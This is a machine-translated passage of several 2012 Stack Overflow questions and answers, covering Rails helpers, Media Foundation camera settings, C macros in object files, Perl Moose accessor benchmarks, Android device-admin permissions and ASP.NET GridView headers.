很明显，嵌套视图的子视图布局链被破坏，使得重新布局子视图不会发生或在发生方向更改时一直调用到表格视图单元格。任何人都知道这是否可以在 Interface Builder 中修复，或者如果不能重新建立链需要什么代码？我知道如何在我自己的 UITableViewController 自定义子类中使用 willRotateToInterfaceOrientation:duration: 来解决这个问题，但我不确定这样做是否干净，我不希望通过提供解决方法的代码片段来部分自动化方向更改对于我认为应该可以自动化的东西。

# ruby-on-rails - 导轨 3.1。如何使菜单生成器输出haml？

> ID：10102833
> 
> 赞同：0
> 
> 时间：2012-04-11T08:57:48.390
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1, haml

我一直在按照一个简短的[教程](http://railsforum.com/viewtopic.php?id=3899)在我的应用程序上构建一个选项卡菜单。

这是 Applciation_helper 中的 menu_builder 方法

```
def menu_builder(page_id)
 tabs = ['events','locations','account']
 content = ""
 tabs.each do |tab|
   content << if page_id == tab
     content_tag('li', content_tag('a', tab, :href => nil ), :class => 'active')
   else
     content_tag('li', content_tag('a', tab, :href => "/#{tab}" ), :class => 'inactive')
   end
 end
 content_tag(:ul, content, :class => 'tabnav')
end 
```

应用程序.html.haml

```
%nav
  = menu_builder(@page_id) 
```

这是输出的源代码

```
<nav>
    <ul class="tabnav">&lt;li class=&quot;active&quot;&gt;&lt;a&gt;events&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;inactive&quot;&gt;&lt;a href=&quot;/locations&quot;&gt;locations&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;inactive&quot;&gt;&lt;a href=&quot;/account&quot;&gt;account&lt;/a&gt;&lt;/li&gt;</ul>
</nav> 
```

我玩过haml_tag 等，但不知道如何使menu_builder 方法输出正确的语法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:27:48.217

尝试替换：

```
content = "" 
```

和：

```
content = "".html_safe 
```

# windows-phone-7 - 在没有任何手动事件的情况下在 windows phone 7 设备上模拟滚动手势

> ID：10102837
> 
> 赞同：2
> 
> 时间：2012-04-11T08:58:18.487
> 
> 标签：windows-phone-7

如何在没有任何手动事件的情况下在 Windows Phone 7 设备上模拟滚动手势？

我想在 WP7 上自动滚动已在 Adob​​e PDF 查看器中打开的 PDF 文档。怎么做到呢？

欢迎任何意见或想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T10:10:12.527

WP7 的 Adob​​e PDF 查看器是一个应用程序。WP7 架构不允许您从自己的应用程序控制或与任何其他正在运行的应用程序通信。因此，不，您不能以编程方式滚动用户打开的 PDF 文档。

您可能希望寻找可以嵌入到应用程序中的 PDF 查看器控件。请参阅此相关问题：

[适用于 Windows Phone 7 的 Silverlight PDF 查看器（SilverDox？）](https://stackoverflow.com/questions/4219990/pdf-viewer-for-silverlight-for-windows-phone-7-silverdox)

# visual-c++ - 微软媒体基金会网络摄像头接口

> ID：10102843
> 
> 赞同：2
> 
> 时间：2012-04-11T08:58:32.980
> 
> 标签：visual-c++, video, windows-7, webcam, ms-media-foundation

我一直在开发一个 c++ 接口，以通过 Micrsoft Media Foundation 从所有类型的网络摄像头中捕获图像。我已经有一些代码可以连接多种类型的网络摄像头，并且能够捕捉不同分辨率和格式的图像。

我知道在 WinXP 下可以通过使用 Direct Show 库来更改网络摄像头的不同参数（如白平衡、曝光时间等）。不幸的是，Direct Show 库中可以轻松从网络摄像头捕获单帧的界面已从 Win7 下的 Direct Show 中删除。有人知道我如何使用 Microsoft Media Foundation 或我可以与 Microsoft Media Foundation 结合的任何其他库来访问这些参数吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-04-18T09:59:57.493

可以从 WMF 调用 DirectShow QueryInterface 方法。示例代码在[Windows Media Foundation: Controlling Camera Properties](http://blogs.microsoft.co.il/pavely/2012/05/19/windows-media-foundation-controlling-camera-properties/)中给出。这应该可以让您设置可用的相机参数，如焦点和白平衡等。

```
HRESULT CMFVideoCaptureDlg::SetupCamera(IMFMediaSource* pCameraSource) {
    CComQIPtr<IAMCameraControl> spCameraControl(pCameraSource);
    HRESULT hr = S_OK;
    if(spCameraControl) {
        long min, max, step, def, control;
        hr = spCameraControl->GetRange(CameraControl_Exposure, &min, &max, &step, &def, &control);
        if(SUCCEEDED(hr))
            hr = spCameraControl->Set(CameraControl_Exposure, 1, CameraControl_Flags_Manual);
    }
    CComQIPtr<IAMVideoProcAmp> spVideo(pCameraSource);
    if(spVideo)
        hr = spVideo->Set(VideoProcAmp_WhiteBalance, 0, VideoProcAmp_Flags_Auto);
    return hr;
} 
```

> 事实证明，Media Foundation 没有为这些任务定义任何特定的接口。奇怪的是，当媒体源是摄像机时，它在其媒体源（由 IMFMediaSource 接口表示）上实现了由其前身 DirectShow 定义的接口

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-17T13:09:11.747

`DirectShow`在 Windows 7 中仍然很好（最容易检查的是使用`GraphEdit`和`AMCap`来自 Windows SDK）。然而，Media Foundation 在早期版本的 Windows 中缺乏必要的支持。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-03-04T04:52:58.473

[这篇文章](http://blogs.microsoft.co.il/pavely/2012/05/19/windows-media-foundation-controlling-camera-properties/)有以下代码，它就像一个魅力！

```
 HRESULT CMFVideoCaptureDlg::SetupCamera(IMFMediaSource* pCameraSource) {
    CComQIPtr spCameraControl(pCameraSource);
    HRESULT hr = S_OK;
    if(spCameraControl) {
        long min, max, step, def, control;
        hr = spCameraControl->GetRange(CameraControl_Exposure, &min, &max, &step, &def, &control);
        if(SUCCEEDED(hr))
            hr = spCameraControl->Set(CameraControl_Exposure, 1, CameraControl_Flags_Manual);
    }
    CComQIPtr spVideo(pCameraSource);
    if(spVideo)
        hr = spVideo->Set(VideoProcAmp_WhiteBalance, 0, VideoProcAmp_Flags_Auto);
    return hr;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T19:30:09.337

IAMCameraControl 和 IANVideoProcAmp 在 Windows 8 中仍然支持白平衡、平移、缩放。相机控制目前还不是 MFT 的一部分。我们必须使用 Direct Show 来做这些事情。

# c - 如何检查C中的目标文件中是否存在宏？

> ID：10102851
> 
> 赞同：1
> 
> 时间：2012-04-11T08:59:16.267
> 
> 标签：c, object-files

例如，我定义了一个宏：

```
#ifdef VERSION
 //.... do something
#endif 
```

如何检查`VERSION`我的目标文件中是否存在？我试图用 反汇编它`objdump`，但没有发现我的宏的实际值`VERSION`。`VERSION`在 Makefile 中定义。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T09:01:48.433

尝试使用中的`-g3`选项进行编译`gcc`。它也将宏信息存储在生成的 ELF 文件中。

在此之后，如果您在输出可执行文件或目标文件中为它定义`MACRO_NAME`了一个宏。`grep`例如，

```
$ grep MACRO_NAME a.out # any object file will do instead of a.out
Binary file a.out matches 
```

或者你甚至可以尝试，

```
$ strings -a -n 1 a.out | grep MACRO_NAME

 -a Do not scan only the initialized and loaded sections of object files; 
    scan the whole files.

 -n min-len Print sequences of characters that are at least min-len characters long,
    instead of the default 4. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-09-10T08:43:28.790

以下命令显示`.debug_macro`DWARF 部分的内容：

```
$ readelf --debug-dump=macro path/to/binary 
```

或者

```
$ objdump --dwarf=macro path/to/binary 
```

您也可以使用`dwarfdump path/to/binary`，但在输出中只保留部分[并不容易。](https://stackoverflow.com/questions/10102851/how-to-check-if-a-macro-exists-in-an-object-file-in-c#comment91426929_10102889)`.debug_macro`

# java - 在我几乎所有的脚本中使用相同的自定义方法

> ID：10102853
> 
> 赞同：0
> 
> 时间：2012-04-11T08:59:28.827
> 
> 标签：java, android, methods

我正在做一个项目，我注意到我需要在几乎所有脚本中复制和粘贴相同的自定义方法。我在做什么错了吗？我一遍又一遍地复制它。任何帮助深表感谢。

样本：

```
public class EventHome extends Activity implements OnClickListener{

    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
    }

    /********************************************************************
    * SHORTENED TOAST                                                   *
    *********************************************************************/
    public void showToast(String value){
        Toast.makeText(getApplicationContext(), value, Toast.LENGTH_SHORT).show();
    }

    /********************************************************************
    * SHORTENED ALERTDIALOG                                             *
    *********************************************************************/
    public void showAlert(String title, String btn_txt, String message){
        final AlertDialog.Builder alert = new AlertDialog.Builder(EventHome.this);
        alert.setTitle(title).setMessage(message)
        .setNeutralButton(btn_txt, new DialogInterface.OnClickListener() {
               public void onClick(DialogInterface dialog, int id) {
                   alert.setCancelable(true);
        }}).show();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:09:13.463

创建一个助手类（让我们说**Helper**）并使用访问修饰符将所有重复方法移动到该类文件中 as `public static`。这样做将允许您以类名作为前缀调用方法。见下文：

```
public class Helper{

    /********************************************************************
    * SHORTENED TOAST                                                   *
    *********************************************************************/
    public static void showToast(Context context, String value){
        Toast.makeText(context, value, Toast.LENGTH_SHORT).show();
    }
} 
```

现在，当您想显示 toast 时，在您的活动中调用以下内容：

```
Helper.showToast(this, "hello world!"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:08:15.817

您可以使用库项目并将此类方法和类放入其中。有关管理 android 库项目的更多信息，请参阅[此内容](http://developer.android.com/guide/developing/projects/projects-eclipse.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T09:08:38.253

有一个原则被称为[DRY](http://en.wikipedia.org/wiki/DRY)：**不要重复自己**。

重复代码没有用，而且容易出错。如果您希望修改重复代码中的行为，则必须在所有代码副本中对其进行修改。这很容易出错，因为代码很容易变得不同步。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T09:10:06.920

这是相当脱离上下文的代码，所以很难给你一个明确的答案，但一般原则保持不变：不要重复代码。您应该致力于消除代码中所有形式的重复，尤其是在处理硬编码值时。这样做的常见方法是在其他类中提供静态函数，或者创建一个包含您将重复需要的所有核心功能的超类。下面是一个简短的例子，说明如何使用`inheritance`和`abstract classes`尽量减少代码重复：

IE

```
abstract class CoreMethods extends Activity implements OnClickListener
{

    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
    }

    /********************************************************************
    * SHORTENED TOAST                                                   *
    *********************************************************************/
    public void showToast(String value){
        Toast.makeText(getApplicationContext(), value, Toast.LENGTH_SHORT).show();
    }

    /********************************************************************
    * SHORTENED ALERTDIALOG                                             *
    *********************************************************************/
    public void showAlert(String title, String btn_txt, String message){
        final AlertDialog.Builder alert = new AlertDialog.Builder(EventHome.this);
        alert.setTitle(title).setMessage(message)
        .setNeutralButton(btn_txt, new DialogInterface.OnClickListener() {
               public void onClick(DialogInterface dialog, int id) {
                   alert.setCancelable(true);
        }}).show();
    }

} 
```

将其保存在名为 CoreMethods.java 或类似文件的文件中。然后，当您需要这些方法时，您可以简单地继承 CoreMethods 类并访问这些函数。

```
public class ExampleClass extends CoreMethods
{
     private void foo() {
         super.showToast("bar");
         super.showAlert("foobar");
     }
} 
```

有关 Java 中继承的更多信息，请参见[此处](http://www.roseindia.net/java/language/inheritance.shtml)

# objective-c - 在 Iphone 中创建数据库时出现 Exc_Bad_Access 异常

> ID：10102855
> 
> 赞同：0
> 
> 时间：2012-04-11T08:59:30.710
> 
> 标签：objective-c, database, exception

调用以下方法后，我收到此异常。它仅在第一次加载应用程序时出现。当我再次打开应用程序时，它工作正常。任何人都可以帮忙吗？

```
-(void) createAndCheckDatabase
{
  BOOL success; 

  self.databaseName = @"database.db";
  NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
  NSString *documentDir = [documentPaths objectAtIndex:0];
  self.databasePath = [[documentDir stringByAppendingPathComponent:self.databaseName]retain];

  NSFileManager *fileManager = [NSFileManager defaultManager];

  success = [fileManager fileExistsAtPath:self.databasePath];

  if(success) return; 

  NSString *databasePathFromApp = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:self.databaseName];

  NSError *err;
  [fileManager copyItemAtPath:databasePathFromApp toPath:self.databasePath error:nil];
  if (err) {
//      DebugLog(@"%@", [err description]);
  }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:55:02.990

if (err) ... 将崩溃，因为 err 未初始化！并且您不在 fileManager copyItemAtPath 中使用它：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T10:00:58.557

`EXEC_BAD_ACCESS`几乎总是意味着处理指针或 C 数组的错误，或者对象被溢出`release`。

好消息是你应该在调试器中有一个堆栈跟踪（如果在 Xcode 中运行），或者一个崩溃日志，它可以准确地显示出了什么问题。（如何[收集](https://developer.apple.com/library/ios/#qa/qa1747/_index.html)和[阅读](https://developer.apple.com/library/ios/#technotes/tn2151/_index.html)崩溃日志）。

使用 Zombies 工具“分析”您的代码是获取有关过度发布的更多信息的最佳方式。

如果您可以发布符号化的堆栈跟踪，我们可以尝试为您提供更好的诊断。

# perl - 在 Moose 中，直接通过对象的内部哈希访问成员变量是否安全？

> ID：10102856
> 
> 赞同：4
> 
> 时间：2012-04-11T08:59:34.100
> 
> 标签：perl, moose

Moose 对象似乎是带有成员变量作为条目的 hashrefs。使用哈希语法访问成员是否安全？我想要的只是获取/设置成员变量的简单能力，但我发现 perl 生成的访问器的速度对于我的应用程序来说是不可接受的，以至于我正在考虑在非 moose OO 中重写它。是的，我知道优化是一种可判处死刑的罪行，但我有十亿以上的行文件，添加一个简单的行计数器变量会增加十亿以上的函数调用，这可能会增加单次运行的时间。

显示缓慢的示例（100x）：

```
package Bullwinkle;
use strict;
use warnings;
use Moose;

has 'x' => (is => 'rw', default => 0);

# counter is also slow
has 'counter' => (
    traits  => ['Counter'],
    is      => 'ro',
    isa     => 'Num',
    default => 0,
    handles => {
        inc_counter   => 'inc',
    },
);

package main;
use strict;
use warnings;
use Benchmark qw/timethese cmpthese/;

my $bull = Bullwinkle->new();
my $hash = { x => 0 };

cmpthese(-1,{ 
    bull => sub{
        $bull->x(1 + $bull->x());
    },
    bull_direct => sub{
        ++$bull->{x}
    },
    bull_counter => sub{
        $bull->inc_counter();
    },
    hash => sub{
        ++$hash->{x}
    },
}); 
```

```

                   评价公牛公牛计数器哈希公牛直接
公牛 983040/s -- -28% -91% -92%
公牛计数器 1362629/s 39% -- -88% -88%
哈希 11251965/s 1045% 726% -- -3%
Bull_direct 11650844/s 1085% 755% 4% --
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-11T10:50:27.843

我会说打破封装永远不安全，Moose 与否。

请注意，您的`bull`测试不会慢 100 倍。请记住，它使用了两次访问器。就在信封的背面，它从每秒 1,000,000 次运行到每秒 2,000,000 次访问。与散列相比，它大约是 6 倍。不过，加上一堆减速，它可以加起来。

但是，我不认为 Moose 是那里的问题。当我尝试使用做同样事情的非 Moose 类时，结果并没有那么好。看起来大部分减速只是来自普通的面向对象的方法调用。使用的非 Moose 和 Moose 类之间的差异`inc_counter`大约是 2 倍。

基准是非常棘手的事情。您确实需要努力梳理出不同的部分，并确保您测试适当的基本案例。当你得到疯狂的数字时，你应该从怀疑者开始并调整事情，直到它们不再那么疯狂。例如，即使 Moose 很慢，如果它像您推测的那样慢，我认为没有人会使用它。慢一点是一回事，数量级或数量级是另一回事。

* * *

我也对基准感到好奇，我想用`make_immutable`. 这是我在运行 Lion 的 Mac Pro 上使用 Moose-2.0403 的默认 Perl5.14.2 的结果。Bull 是您的原始代码，Rocky 使用`make_immutable`，而 Natasha 是一个非 Moose 类，它做同样的事情：

```
 Rate  bull rocky natasha bull_counter rocky_counter natasha_x rocky_x bull_x natasha_counter rocky_direct bull_direct natasha_direct hash
bull              728177/s    --   -6%    -17%         -42%          -43%      -65%    -66%   -67%            -71%         -93%        -94%           -94% -95%
rocky             771011/s    6%    --    -12%         -39%          -39%      -63%    -64%   -65%            -70%         -93%        -93%           -94% -95%
natasha           877713/s   21%   14%      --         -30%          -31%      -58%    -59%   -60%            -66%         -92%        -92%           -93% -94%
bull_counter     1260308/s   73%   63%     44%           --           -1%      -40%    -42%   -42%            -51%         -88%        -89%           -89% -91%
rocky_counter    1274310/s   75%   65%     45%           1%            --      -39%    -41%   -42%            -50%         -88%        -89%           -89% -91%
natasha_x        2105717/s  189%  173%    140%          67%           65%        --     -3%    -4%            -17%         -81%        -81%           -82% -85%
rocky_x          2163925/s  197%  181%    147%          72%           70%        3%      --    -1%            -15%         -80%        -81%           -82% -85%
bull_x           2184533/s  200%  183%    149%          73%           71%        4%      1%     --            -14%         -80%        -80%           -82% -85%
natasha_counter  2548621/s  250%  231%    190%         102%          100%       21%     18%    17%              --         -77%        -77%           -79% -82%
rocky_direct    10901037/s 1397% 1314%   1142%         765%          755%      418%    404%   399%            328%           --         -3%            -9% -24%
bull_direct     11202734/s 1438% 1353%   1176%         789%          779%      432%    418%   413%            340%           3%          --            -6% -21%
natasha_direct  11939231/s 1540% 1449%   1260%         847%          837%      467%    452%   447%            368%          10%          7%             -- -16%
hash            14252488/s 1857% 1749%   1524%        1031%         1018%      577%    559%   552%            459%          31%         27%            19%   -- 
```

这是我的程序：

```
#!/Users/brian/bin/perls/perl5.14.2
use v5.10.1;
use strict;
use warnings;

use Benchmark qw/timethese cmpthese/;

package Bullwinkle {
    use strict;
    use warnings;
    use Moose;

    has 'x' => (is => 'rw', default => 0);

    # counter is also slow
    has 'counter' => (
        traits  => ['Counter'],
        is      => 'ro',
        isa     => 'Num',
        default => 0,
        handles => {
            inc_counter   => 'inc',
        },
    );
    }

package Rocky {
    use strict;
    use warnings;
    use Moose;

    has 'x' => (is => 'rw', default => 0);

    # counter is also slow
    has 'counter' => (
        traits  => ['Counter'],
        is      => 'ro',
        isa     => 'Num',
        default => 0,
        handles => {
            inc_counter   => 'inc',
        },
    );

    __PACKAGE__->meta->make_immutable;
    }

package Natasha {
    use strict;
    use warnings;

    sub new { bless { 'x' => 0 }, $_[0] }
    sub inc_counter { $_[0]->{x} += 1 }
    sub x           { 
        if( defined $_[1] ) { $_[0]->{x} = $_[1] }
        else                { $_[0]->{x} }
        }
    }

my $bull    = Bullwinkle->new;
my $rocky   = Rocky->new;
my $natasha = Natasha->new;

my $hash  = { 'x' => 0 };

cmpthese(-1,{ 
    bull          => sub { $bull->x(1 + $bull->x )   },
    bull_x        => sub { $bull->x                  },
    bull_direct   => sub { ++$bull->{'x'}            },
    bull_counter  => sub { $bull->inc_counter        },

    rocky         => sub { $rocky->x(1 + $rocky->x ) },
    rocky_x       => sub { $rocky->x                 },
    rocky_direct  => sub { ++$rocky->{'x'}           },
    rocky_counter => sub { $rocky->inc_counter       },

    natasha         => sub { $natasha->x(1 + $natasha->x ) },
    natasha_x       => sub { $natasha->x                   },
    natasha_direct  => sub { ++$natasha->{'x'}             },
    natasha_counter => sub { $natasha->inc_counter         },

    hash          => sub { ++$hash->{'x'}            },
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-15T17:33:54.400

我认为这个基准测试还应该考虑以旧方式编写 Perl 类的“通常”方式：即使用 $self 变量。

在这种情况下，公牛好 3%，洛基好 12%。

这是原始结果：

```
 Rate tatiana  bull rocky natasha bull_counter rocky_counter tatiana_x tatiana_counter bull_x natasha_x rocky_x natasha_counter bull_direct hash tatiana_direct rocky_direct natasha_direct
tatiana           785983/s      --   -3%  -11%    -20%         -35%          -37%      -55%            -61%   -66%      -67%    -67%            -68%        -94% -95%           -95%         -95%           -95%
bull              811471/s      3%    --   -8%    -17%         -33%          -34%      -54%            -60%   -65%      -66%    -66%            -67%        -94% -94%           -94%         -94%           -95%                                 
rocky             882215/s     12%    9%    --    -10%         -27%          -29%      -50%            -56%   -62%      -63%    -63%            -64%        -93% -94%           -94%         -94%           -94%
natasha           983039/s     25%   21%   11%      --         -18%          -21%      -44%            -51%   -58%      -58%    -59%            -60%        -93% -93%           -93%         -93%           -94%
bull_counter     1203020/s     53%   48%   36%     22%           --           -3%      -31%            -40%   -48%      -49%    -50%            -50%        -91% -92%           -92%         -92%           -92%
rocky_counter    1238753/s     58%   53%   40%     26%           3%            --      -29%            -39%   -47%      -48%    -49%            -49%        -91% -91%           -91%         -91%           -92%
tatiana_x        1747627/s    122%  115%   98%     78%          45%           41%        --            -13%   -25%      -26%    -28%            -28%        -87% -88%           -88%         -88%           -89%
tatiana_counter  2016491/s    157%  148%  129%    105%          68%           63%       15%              --   -13%      -15%    -16%            -17%        -85% -86%           -86%         -86%           -87%
bull_x           2316929/s    195%  186%  163%    136%          93%           87%       33%             15%     --       -2%     -4%             -5%        -82% -84%           -84%         -84%           -85%
natasha_x        2360644/s    200%  191%  168%    140%          96%           91%       35%             17%     2%        --     -2%             -3%        -82% -83%           -84%         -84%           -85%
rocky_x          2414483/s    207%  198%  174%    146%         101%           95%       38%             20%     4%        2%      --             -1%        -82% -83%           -83%         -83%           -85%
natasha_counter  2429401/s    209%  199%  175%    147%         102%           96%       39%             20%     5%        3%      1%              --        -81% -83%           -83%         -83%           -85%
bull_direct     13107199/s   1568% 1515% 1386%   1233%         990%          958%      650%            550%   466%      455%    443%            440%          --  -8%           -10%         -10%           -17%
hash            14298763/s   1719% 1662% 1521%   1355%        1089%         1054%      718%            609%   517%      506%    492%            489%          9%   --            -2%          -2%           -10%
tatiana_direct  14563556/s   1753% 1695% 1551%   1381%        1111%         1076%      733%            622%   529%      517%    503%            499%         11%   2%             --          -0%            -8%
rocky_direct    14563556/s   1753% 1695% 1551%   1381%        1111%         1076%      733%            622%   529%      517%    503%            499%         11%   2%             0%           --            -8%
natasha_direct  15827561/s   1914% 1850% 1694%   1510%        1216%         1178%      806%            685%   583%      570%    556%            552%         21%  11%             9%           9%             -- 
```

以及新测试用例的差异（注意新的 Tatiana 类）：

```
--- bench.old   2012-04-15 19:29:55.000000000 +0200
+++ bench.pl    2012-04-15 19:17:25.000000000 +0200
@@ -57,9 +57,26 @@
         }
     }

+package Tatiana {
+    use strict;
+    use warnings;
+
+    sub new { bless { 'x' => 0 }, $_[0] }
+    sub inc_counter { 
+        my $self = shift ;
+        $self->{x} += 1 
+    }
+    sub x           { 
+        my ($self,$arg) = @_ ;
+        if( defined $arg ) { $self->{x} = $arg }
+        else               { $self->{x} }
+        }
+    }
+
 my $bull    = Bullwinkle->new;
 my $rocky   = Rocky->new;
 my $natasha = Natasha->new;
+my $tatiana = Tatiana->new;

 my $hash  = { 'x' => 0 };

@@ -79,5 +96,10 @@
     natasha_direct  => sub { ++$natasha->{'x'}             },
     natasha_counter => sub { $natasha->inc_counter         },

+    tatiana         => sub { $tatiana->x(1 + $tatiana->x ) },
+    tatiana_x       => sub { $tatiana->x                   },
+    tatiana_direct  => sub { ++$tatiana->{'x'}             },
+    tatiana_counter => sub { $tatiana->inc_counter         },
+    
     hash          => sub { ++$hash->{'x'}            },
 }); 
```

希望这可以帮助

# android - Logcat：未授予 android.permission.BIND_DEVICE_ADMIN 包 com.myprojects.myapp 的权限（protectionLevel=2 flags=0xbe46）

> ID：10102859
> 
> 赞同：1
> 
> 时间：2012-04-11T08:59:39.450
> 
> 标签：android, broadcastreceiver, android-logcat, bootcompleted

我有一个启动完整的广播接收器，但它没有按预期工作。也不是需要 STATUS_BAR 权限的全屏活动。

我试图在手机启动时查看 LogCat 日志，这就是我发现的：

**日志**

```
 04-11 14:23:48.718: W/PackageManager(133): Not granting permission 
    android.permission.BIND_DEVICE_ADMIN to package com.myprojects.myapp (protectionLevel=2 flags=0xbe46) 
```

任何线索为什么会发生这种情况？

我的清单文件有：

```
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>

<receiver android:name="com.myprojects.myapp.DeviceAdministrationReceiver"
        android:permission="android.permission.BIND_DEVICE_ADMIN">  
       <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_policies" />

    <intent-filter>
            <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>

<receiver android:name="com.myprojects.myapp.BootCompleteReceiver">  
        <intent-filter>  
            <action android:name="android.intent.action.BOOT_COMPLETED" />  
        </intent-filter>  
</receiver> 
```

**编辑** 和其他两个类似的日志：

```
04-11 14:24:17.810: W/PackageManager(133): Not granting permission android.permission.STATUS_BAR to package com.myprojects.myapp (protectionLevel=3 flags=0xbe46)

04-11 14:24:17.810: W/PackageManager(133): Not granting permission android.permission.WRITE_SECURE_SETTINGS to package com.myprojects.myapp (protectionLevel=3 flags=0xbe46) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:16:44.237

如果您是扩展`DeviceAdminReceiver`，则必须为接收器添加*元数据*和*描述*，例如：

```
<receiver 
    android:name=".AdminReceiver" 
    android:description="@string/description" 
    android:label="@string/labelValue" 
    android:permission="android.permission.BIND_DEVICE_ADMIN" 
 > 
 <meta-data  
  android:name="android.app.device_admin" 
  android:resource="@xml/lockourscreen"/> 
  <intent-filter> 
   <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /> 
  </intent-filter> 
</receiver> 
```

`BIND_DEVICE_ADMIN`正如[医生](http://developer.android.com/reference/android/Manifest.permission.html)所说： `Must be required by device administration receiver, to ensure that only the system can interact with it.`

所以`<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>`从应用程序级别删除行

# actionscript-3 - 本地闪录声音

> ID：10102860
> 
> 赞同：0
> 
> 时间：2012-04-11T08:59:39.793
> 
> 标签：actionscript-3, apache-flex, adobe, flash

使用 flex，我们可以从麦克风录制声音并在本地存储并稍后上传吗？有没有相关链接请注明

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:46:38.980

查看此[链接](http://www.adobe.com/devnet/air/flex/articles/using_mic_api.html)了解如何使用麦克风进行录音并使用[FileReference](http://www.adobe.com/devnet/flash/quickstart/filereference_class_as3.html)保存录音

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:48:46.270

可以使用麦克风 API SAMPLE_DATA 事件录制音频。事件的 data 属性是一个带有音频数据的 ByteArray。

基于 Web 的 Flash 应用程序可以将这些数据样本复制到内存中的数据结构中，并提示用户将数据保存到本地文件中。AIR 应用程序将能够将数据直接写入文件系统或 SQL 数据库。

有关在 ActionScript 中从麦克风访问音频的信息，请参阅以下链接：

*   [http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7d1d.html](http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7d1d.html)
*   [http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Microphone.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/media/Microphone.html)

它可能有助于以标准化格式对数据进行编码，以帮助以后阅读和编辑（[WAV](http://en.wikipedia.org/wiki/WAV)或[PCM](http://en.wikipedia.org/wiki/PCM)）。您可能还想使用压缩来减小传输文件的大小（例如：[来自 Adob​​e 的 Ogg Vorbis 编解码器](http://labs.adobe.com/wiki/index.php/Alchemy%3aLibraries)）。

# asp.net - 在网格视图中需要两个标题行

> ID：10102861
> 
> 赞同：2
> 
> 时间：2012-04-11T08:59:43.167
> 
> 标签：asp.net, gridview

我有一个购物车项目的网格视图，它是在运行时绑定的，现在我的要求是我想要网格中的两个标题行，如下图所示，这怎么可能？谁能帮我？

[我的网格设计 http://content.screencast.com/users/Pr6546/folders/Default/media/f7da2da4-f80e-4674-b1d4-0ccd872966d2/Capture.PNG](http://content.screencast.com/users/Pr6546/folders/Default/media/f7da2da4-f80e-4674-b1d4-0ccd872966d2/Capture.PNG) [http://www.screencast.com/t/g4HkqlSpx](http://www.screencast.com/t/g4HkqlSpx)

下面是我的网格源

```
<asp:GridView ID="gvCheckOutItems" GridLines="None" ShowFooter="true" DataKeyNames="Item_No"
    Width="100%" border="0" CellSpacing="0" CellPadding="5" AutoGenerateColumns="false"
    CssClass="Checkout-Grid" runat="server" OnRowCreated="gvCheckOutItems_RowCreated">
    <Columns>
        <asp:TemplateField HeaderStyle-Width="7%">
            <ItemTemplate>
                <asp:LinkButton ID="lnkBtnRemove" runat="server" OnClick="lnkBtnRemove_Click" Text="Remove"
                    CssClass="blue-link"></asp:LinkButton>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:BoundField HeaderText="Item No" HeaderStyle-HorizontalAlign="Left" ItemStyle-HorizontalAlign="Left"
            DataField="Item_No" HeaderStyle-Width="7%" />
        <asp:BoundField HeaderText="Title" HeaderStyle-HorizontalAlign="Left" FooterStyle-HorizontalAlign="Center"
            ItemStyle-HorizontalAlign="Left" DataField="Title" HeaderStyle-Width="25%" />
        <asp:BoundField HeaderText="Offered By" HeaderStyle-HorizontalAlign="Left" ItemStyle-HorizontalAlign="Left"
            DataField="Trainer" HeaderStyle-Width="16%" FooterText="<strong>Order Total</strong>" />
        <asp:TemplateField>
            <ItemTemplate>
                <asp:TextBox ID="txtItemFormat" runat="server" Text='<%# Eval("Item_Format") %>'
                    Visible="false"></asp:TextBox>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:BoundField HeaderText="Format" HeaderStyle-HorizontalAlign="Left" ItemStyle-HorizontalAlign="Left"
            DataField="Format" HeaderStyle-Width="15%" />
        <asp:BoundField HeaderText="Duration" ItemStyle-HorizontalAlign="Right" DataField="Duration"
            HeaderStyle-Width="7%" />
        <asp:TemplateField HeaderStyle-Width="7%" HeaderStyle-HorizontalAlign="Right" ItemStyle-HorizontalAlign="Right"
            FooterStyle-HorizontalAlign="Right" HeaderText="Quantity">
            <ItemTemplate>
                <asp:TextBox ID="txtQuantity" Enabled="false" CssClass="quantity" Text='<%#Eval("Quantity")%>'
                    onblur="fnquantityEmpty(this)" onkeyup="extractNumber(this,0,false);" onkeypress="return blockNonNumbers(this, event, false, false);"
